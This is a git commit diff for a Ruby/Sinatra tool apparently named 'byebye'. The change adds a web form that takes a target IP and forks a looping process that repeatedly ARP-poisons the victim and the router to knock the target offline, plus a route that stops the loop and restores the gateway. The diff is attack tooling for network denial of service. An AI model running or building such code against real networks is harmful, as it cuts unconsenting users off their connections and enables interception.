eca82b970b9f8ef772b4c59482572d4cfe39526b
ex0dus-0x <ex0dus@codemuch.tech>
2018-02-23 22:08:35 -0500

    Fixed web mode for deauthentication

--- Gemfile
+++ Gemfile
@@ -1,11 +1,12 @@
 # frozen_string_literal: true
 source "https://rubygems.org"
-
+	
 # gem "rails"
 gem "macaddr"
 gem "packetfu"
 gem "ipscanner"
 gem "colorize"
+gem "terminal-table"
 
 gem "sinatra"
 gem "sinatra-reloader"
--- src/web.rb
+++ src/web.rb
@@ -12,16 +12,18 @@ require_relative 'poison.rb'
 #   Execute byebye web service!
 ##############################################
 
+$child_pid = nil
+$address = nil
 
 class ByeApp < Sinatra::Base
-    
+
   # Configure and register reloader to reload on changes
   configure :development do
     set :logging, false
     set :public_folder, File.dirname(__FILE__) + '/views'
     register Sinatra::Reloader
   end
-  
+
   before do
     @iface = settings.iface.to_s
     @mac = settings.mac.to_s
@@ -30,21 +32,45 @@ class ByeApp < Sinatra::Base
   end
 
   # Default / path
-  get '/' do    
+  get '/' do
     Socket.do_not_reverse_lookup = false
     @head = "Welcome to byebye, #{Socket.gethostname}!"
     erb :index
   end
-  
+
   post '/' do
-    address = "#{params['ip']}".chomp
-    
-    # TODO: Fix ArgumentError
-    poison_victim(@iface, @mac, @gateway_ip, address)
-    poison_router(@iface, @mac, @gateway_ip, @gateway_mac, address)
-    
-    @deauth_text = "Deauthenticating #{address}"
+    $address = "#{params['ip']}".gsub(/\s+/, "")
+
+    $child_pid = Process.fork do
+      while true
+        
+        Signal.trap("SIGHUP") {
+          puts "Killing deauthentication child process!"
+          Process.exit
+        }
+        sleep 1
+        puts "Deauthenticating... #{$address}"
+
+        poison_victim(@iface, @mac, @gateway_ip, $address)
+        poison_router(@iface, @mac, @gateway_ip, @gateway_mac, $address)
+
+      end
+    end
+
+    Process.detach $child_pid
+
+    @deauth_text = "Deauthenticating #{$address}"
+    erb :index
+
+  end
+
+  get '/stop' do
+    Process.kill("SIGHUP", $child_pid)
+
+    restore(@iface, @mac, @gateway_ip, @gateway_mac, $address)
+
+    @deauth_text = "Stopped and restored gateway!"
     erb :index
   end
-  
+
 end
